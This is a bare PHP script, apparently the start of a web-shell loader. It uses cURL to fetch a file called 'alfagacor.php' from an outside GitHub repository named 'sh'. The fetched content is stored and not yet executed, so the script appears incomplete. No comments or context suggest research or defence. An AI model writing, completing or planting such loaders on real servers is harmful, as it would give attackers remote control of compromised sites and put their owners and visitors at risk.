<?php
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
    $Url = "https://raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/alfagacor.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
?>


